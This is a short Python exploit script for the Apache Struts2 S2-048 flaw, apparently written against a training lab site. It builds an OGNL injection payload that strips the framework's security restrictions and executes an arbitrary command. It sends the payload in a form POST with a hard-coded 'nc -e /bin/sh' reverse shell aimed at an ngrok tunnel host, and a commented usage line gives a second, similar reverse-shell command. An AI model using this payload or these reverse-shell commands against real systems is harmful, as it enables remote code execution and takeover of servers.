import requests


def exploit(url, cmd):
  print("[+] command: %s" % cmd)

  payload = "%{"
  payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
  payload += "(#_memberAccess?(#_memberAccess=#dm):"
  payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
  payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
  payload += "(#ognlUtil.getExcludedPackageNames().clear())."
  payload += "(#ognlUtil.getExcludedClasses().clear())."
  payload += "(#context.setMemberAccess(#dm))))."
  payload += "(@java.lang.Runtime@getRuntime().exec('%s'))" % cmd
  payload += "}"

  data = {
    "name": payload,
    "age": 20,
    "__checkbox_bustedBefore": "true",
    "description": 1
  }

  headers = {
    'Referer': 'https://lesson1-vulncomponent.migal.in/integration/editGangster'
  }
  requests.post(url, data=data, headers=headers)


if __name__ == '__main__':
  # import sys

  # if len(sys.argv) != 3:
  #   print("python %s <url> <cmd>" % sys.argv[0])
  #   sys.exit(0)

  print('[*] exploit Apache Struts2 S2-048')
  url = "https://lesson1-vulncomponent.migal.in/integration/saveGangster.action"
  cmd = "nc -e /bin/sh 7.tcp.eu.ngrok.io 13074"

  exploit(url, cmd)

  # $ ncat -v -l -p 4444 &
  # $ python exploit_S2-048.py https://lesson1-vulncomponent.migal.in/integration/saveGangster.action "ncat -e /bin/bash 4.tcp.eu.ngrok.io 13346"
